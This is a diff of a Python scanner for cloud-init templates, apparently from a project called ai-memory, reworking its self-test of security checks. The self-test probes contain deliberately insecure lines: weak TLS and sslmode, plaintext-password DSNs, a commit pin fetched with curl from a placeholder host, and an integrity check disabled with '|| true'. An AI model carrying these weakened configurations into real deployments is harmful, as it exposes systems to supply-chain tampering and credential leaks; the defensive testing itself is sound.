+        phys[ln.last - 1] = phys[ln.last - 1] + " #m"
+        out.append((raw, nm, "\n".join(phys)))
+    return out
 
 
 def self_test(known: set) -> int:
-    real = (ROOT / AWS_TEMPLATE).read_text(encoding="utf-8")
-    age_call = '        fetch_pinned https://github.com/apache/age.git /opt/age-src "$AGE_COMMIT"\n'
-    rev_line = '          && [ "$(git -C "$2" rev-parse HEAD)" = "$3" ] \\\n'
-    handler = '|| { echo "pin mismatch: $1 did not resolve to $3"; return 1; }'
-    age_assign = "      AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4\n"
-    dsn = "      postgres://u:p@localhost/db?sslmode=verify-full&sslrootcert=/c\n"
-    unit = "ExecStart=/opt/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9077 --tls-cert /a --tls-key /b\n"
-    good = dsn + unit
-    probes = {
-        "bind flag": good.replace("--host 0.0.0.0", "--bind 0.0.0.0:9077"),
-        "no tls": dsn + "ExecStart=/opt/ai-memory/bin/ai-memory serve --host 0.0.0.0 --port 9077\n",
-        "tls key missing": good.replace(" --tls-key /b", ""),
-        "no sslmode": good.replace("?sslmode=verify-full&sslrootcert=/c", ""),
-        "weak sslmode": good.replace("verify-full", "require"),
-        "non-ascii": "# em dash \u2014\n" + good,
-        "zero serve lines": dsn + "ExecStart=/opt/ai-memory/fed-bootstrap.sh\n",
-        "env wrapper, bad flag": good.replace("ExecStart=/opt/", "ExecStart=/usr/bin/env /opt/").replace("--host 0.0.0.0", "--bind 0.0.0.0:9077"),
-        "env wrapper, no tls": dsn + "ExecStart=/usr/bin/env ai-memory serve --host 0.0.0.0 --port 9077\n",
-        "global flag before serve, no tls": dsn + "ExecStart=/opt/ai-memory/bin/ai-memory --db /x serve --host 0.0.0.0\n",
-        "global flag before serve, bad flag": good.replace("ai-memory serve", "ai-memory --db /x serve").replace("--port", "--prot"),
-        "continuation, tls key on next line missing": dsn + "ExecStart=/opt/ai-memory/bin/ai-memory serve --host 0.0.0.0 \\\n  --tls-cert /a\n",
-        "continuation, bad flag": good.replace("--port 9077", "\\\n  --prot 9077"),
-        "git clone of a branch": good + "        git clone https://github.com/apache/age.git /opt/age-src\n",
-        "git checkout of a branch": good + "        git checkout release/PG18/1.8.0\n",
-        "short commit pin": good + "      AGE_COMMIT=e43dc1a\n",
-        "4657 aws: git -C fetch of a branch then checkout FETCH_HEAD": mutate(real, age_call, "        git init -q /opt/age-src\n        git -C /opt/age-src fetch -q origin release/PG18/1.8.0\n        git -C /opt/age-src checkout -q FETCH_HEAD\n"),
-        "4657 aws: fetch_pinned without its rev-parse check": mutate(real, rev_line, ""),
-        "4657 aws: fetch_pinned called with a branch": mutate(real, age_call, '        fetch_pinned https://github.com/apache/age.git /opt/age-src release/PG18/1.8.0\n'),
-        "4657 aws: fetch_pinned called with an unassigned variable": mutate(real, '/opt/age-src "$AGE_COMMIT"', '/opt/age-src "$OTHER_COMMIT"'),
-        "4657 aws: pin reassigned from a command": mutate(real, age_assign, age_assign + "      AGE_COMMIT=$(curl -fsS https://example.invalid/head)\n"),
-        "4657 aws: second fetch_pinned definition": mutate(real, "      # pgvector v0.8.6 (git ls-remote", "      fetch_pinned() { true; }\n      # pgvector v0.8.6 (git ls-remote"),
-        "4657 aws: failure handler replaced by true": mutate(real, handler, "|| true"),
-        "4657 aws: git pull outside fetch_pinned": mutate(real, age_call, age_call + "        git -C /opt/age-src pull -q\n"),
-        "4658 aws: unknown short flag": mutate(real, "serve --host 0.0.0.0", "serve -b 0.0.0.0:9077 --host 0.0.0.0"),
-        "4658 aws: systemd ${VAR} after a value": mutate(real, "--port 9077 ", "--port 9077 ${EXTRA_SERVE_FLAGS} "),
-        "4658 aws: escaped $${VAR} after a value": mutate(real, "--port 9077 ", "--port 9077 $${EXTRA_SERVE_FLAGS} "),
-        "4658 aws: unbraced $VAR as a value": mutate(real, "--port 9077 ", "--port $PORT "),
-        "4658 aws: stray positional argument": mutate(real, "--port 9077 ", "--port 9077 stray "),
-        "4658 aws: short help flag": mutate(real, "serve --host", "serve -h --host"),
-        "4658 aws: partial interpolation with a bare dollar": mutate(real, "--port 9077 ", "--port ${a}$b "),
-        "4662 aws: --store-url on the serve argv": mutate(real, "--port 9077 --tls-cert", "--port 9077 " + SU + " postgres://aimemory:x@localhost/aimemory?sslmode=verify-full --tls-cert"),
-        "4662 aws: --store-url=<dsn>": mutate(real, "--port 9077 --tls-cert", "--port 9077 " + SU + "=postgres://aimemory:x@localhost/aimemory?sslmode=verify-full --tls-cert"),
-        "4662 aws: --store-url through a ${VAR}": mutate(real, "--port 9077 --tls-cert", "--port 9077 --store-url ${DSN} --tls-cert"),
-        "4662 aws: --store-url split across continuation lines": mutate(real, "--port 9077 --tls-cert", "--port 9077 \\\n  --store-url \\\n  postgres://aimemory:x@localhost/aimemory?sslmode=verify-full \\\n  --tls-cert"),
-        "4662 aws: bash-style split --store-\\<newline>url": mutate(real, "--port 9077 --tls-cert", "--port 9077 --store-\\\nurl postgres://aimemory:x@localhost/aimemory?sslmode=verify-full --tls-cert"),
-        "4662 aws: store URL as a value of another flag": mutate(real, "--port 9077", "--port postgres://aimemory:x@localhost/aimemory?sslmode=verify-full"),
-        "4662 aws: global --store-url before serve": mutate(real, "ai-memory serve", "ai-memory " + SU + " postgres://aimemory:x@localhost/aimemory?sslmode=verify-full serve"),
-        "4662 aws: shell -c wrapper around serve": mutate(real, "ExecStart=/usr/local/lib/ai-memory/bin/ai-memory serve", "ExecStart=/bin/sh -c 'exec /usr/local/lib/ai-memory/bin/ai-memory serve"). replace("--tls-key /etc/ai-memory/tls/node.key", "--tls-key /etc/ai-memory/tls/node.key'"),
-        "4662 aws: runuser wrapper around serve": mutate(real, "ExecStart=/usr/local/lib/ai-memory/bin/ai-memory serve", "ExecStart=/usr/sbin/runuser -u aimemory -- /usr/local/lib/ai-memory/bin/ai-memory serve"),
-        "4659 aws: weak URL in Environment=AI_MEMORY_STORE_URL next to a compliant store-url file": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", "Environment=AI_MEMORY_STORE_URL=postgres://aimemory:x@localhost/aimemory"),
-        "4659 aws: weak URL passed to another program": mutate(real, "      systemctl daemon-reload", '      psql "postgres://aimemory:x@localhost/aimemory?sslmode=require" -c "select 1"\n      systemctl daemon-reload'),
-        "4659 aws: weak URL after --store-url outside the unit": mutate(real, "      systemctl daemon-reload", "      /opt/ai-memory/bin/ai-memory schema-init " + SU + " postgres://aimemory:x@localhost/aimemory\n      systemctl daemon-reload"),
-        "4659 aws: Environment= name split by a bash continuation": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", "Environment=AI_MEMORY_STORE_\\\nURL=postgres://aimemory:x@localhost/aimemory"),
-        "4664 aws: password-bearing DSN with verify-full in Environment=": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", "Environment=AI_MEMORY_STORE_URL=postgres://aimemory:pw@localhost/aimemory?sslmode=verify-full"),
-        "4664 aws: quoted Environment= with a password DSN": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", 'Environment="AI_MEMORY_STORE_URL=postgres://aimemory:pw@localhost/aimemory?sslmode=verify-full"'),
-        "4664 aws: Environment= store URL from a templated value": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", "Environment=AI_MEMORY_STORE_URL=${dsn}"),
-        "4664 aws: password DSN under another name in the 0644 unit": mutate(real, "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url", "Environment=AI_MEMORY_STORE_URL_FILE=/etc/ai-memory/store-url\n      Environment=COPY=postgres://aimemory:pw@localhost/aimemory?sslmode=verify-full"),
-        "serve with unidentified binary": dsn + "ExecStart=/opt/ai-memory/bin/wrapper serve --host 0.0.0.0 --tls-cert /a --tls-key /b\n",
-    }
-    red = 0
-    for label, text in probes.items():
-        if scan_text(label, text, known):
-            red += 1
-        else:
-            print("SELF-TEST FAIL: probe not flagged: " + label, file=sys.stderr)
-    greens = {
-        "4657 aws template as shipped": real,
-        "4662 env wrapper with an assignment": good.replace("ExecStart=/opt/", "ExecStart=/usr/bin/env -i HOME=/x /opt/"),
-        "4658 value is a terraform interpolation": good.replace("--port 9077", "--port ${port}"),
-        "4658 value is a systemd ${VAR} (do-hive quorum-peers shape)": good + "ExecStart=/opt/ai-memory/bin/ai-memory serve --tls-cert /a --tls-key /b --quorum-peers $${PEERS}\n",
-        "4658 flag with = and an interpolation": good.replace("--port 9077", "--port=${port}"),
-        "clean": good,
-        "env wrapper": good.replace("ExecStart=/opt/", "ExecStart=/usr/bin/env /opt/"),
-        "global flag before serve": good.replace("ai-memory serve", "ai-memory --db /x serve"),
-        "continuation": good.replace("--port 9077", "\\\n  --port 9077"),
-        "pinned fetch": good + "      AGE_COMMIT=e43dc1a12b78fba4acef9835b2b10379b8d243b4\n      # git clone is only mentioned in a comment\n",
-        "terraform directive": good.rstrip() + "%{ if x } --quorum-writes 2%{ endif }\n",
-    }
-    clean = 0
-    for label, text in greens.items():
-        got = scan_text(label, text, known)
-        if got:
-            print("SELF-TEST FAIL: green probe flagged: %s: %s" % (label, got), file=sys.stderr)
-        else:
-            clean += 1
-    # An argument the parser does not define must exit 2, not run the scan.
-    try:
-        with contextlib.redirect_stderr(io.StringIO()):
-            build_parser().parse_args(["--selftest"])
-        argparse_red = False
-    except SystemExit as exc:
-        argparse_red = exc.code == 2
-    if not argparse_red:
-        print("SELF-TEST FAIL: a mistyped argument did not exit 2", file=sys.stderr)
-    if red != len(probes) or clean != len(greens) or not argparse_red:
-        print("SELF-TEST FAIL: %d/%d red, %d/%d green, argparse=%s" % (red, len(probes), clean, len(greens), argparse_red), file=sys.stderr)
-        return 2
-    print("self-test: %d red probes flagged, %d green probes clean, mistyped argument exits 2" % (red, clean))
+    base = load_repo()
+    cache = {}
+    bad, counts = [], {"red": 0, "green": 0, "fault": 0}
+    for label, expect, spec in build_probes():
+        t, mt, a, p, auto, extra = case_inputs(base, spec)
+        hits, faults, _ = run_scan(t, mt, a, p, known, autolist=auto, extra=extra, cache=cache)
+        got = verdict(hits, faults, spec)
+        counts[expect] += 1
+        if got != expect:
+            bad.append("%s: expected %s, got %s %s" % (label, expect, got, (faults or hits or [""])[0][:140]))
+    muts = entry_mutations(base, cache)
+    for raw, nm, text in muts:
+        t = dict(base[0])
+        t[nm] = text
+        hits, faults, _ = run_scan(t, base[1], base[2], base[3], known, cache=cache)
+        if faults or not any("not in the allowlist" in h for h in hits):
+            bad.append("entry mutation stayed green: " + raw[:100])
+    with contextlib.redirect_stderr(io.StringIO()):
+        try:
+            build_parser().parse_args(["--bogus"])
+            bad.append("a mistyped argument was accepted")
+        except SystemExit as exc:
+            if exc.code != 2:
+                bad.append("a mistyped argument exited %r, not 2" % exc.code)
+    if bad:
+        print("\n".join("SELF-TEST FAIL: " + b for b in bad), file=sys.stderr)
+        return 1
+    print("SELF-TEST PASS: %d red probes flagged, %d green probes clean, %d form faults raised, %d/%d allow-entry mutations red, mistyped argument exits 2"
+          % (counts["red"], counts["green"], counts["fault"], len(muts), len(muts)))
     return 0
 
 
@@ -530,21 +1826,25 @@ def main(argv: list) -> int:
         known = serve_flags(SERVE_SRC.read_text(encoding="utf-8"))
         if args.self_test:
             return self_test(known)
-        templates = sorted(ROOT.glob(TEMPLATE_GLOB))
-        if len(templates) < 2:
-            print("FAULT: expected at least 2 templates, found %d" % len(templates), file=sys.stderr)
-            return 2
-        hits = []
-        for path in templates:
-            hits.extend(scan_text(str(path.relative_to(ROOT)), path.read_text(encoding="utf-8"), known))
+        templates, maintfs, allow, pend = load_repo()
+        if args.list_triggers:
+            print("\n".join(list_triggers(templates, {})))
+            return 0
+        hits, faults, stats = run_scan(templates, maintfs, allow, pend, known)
     except (OSError, RuntimeError, UnicodeDecodeError) as exc:
         print("FAULT: %s" % exc, file=sys.stderr)
         return 2
+    if faults:
+        print("\n".join("FAULT: " + f for f in faults), file=sys.stderr)
+        if hits:
+            print("\n".join(hits), file=sys.stderr)
+        return 2
     if hits:
         print("\n".join(hits), file=sys.stderr)
-        print("FAIL: %d cloud-init serve defect(s)" % len(hits), file=sys.stderr)
+        print("FAIL: %d cloud-init template defect(s)" % len(hits), file=sys.stderr)
         return 1
-    print("PASS: %d templates checked, %d serve flags known" % (len(templates), len(known)))
+    print("PASS: %d templates, %d allow entries, %d pending entries, %d triggered lines, %d serve flags known"
+          % (stats["templates"], stats["allow"], stats["pending"], stats["triggered"], len(known)))
     return 0
 
 
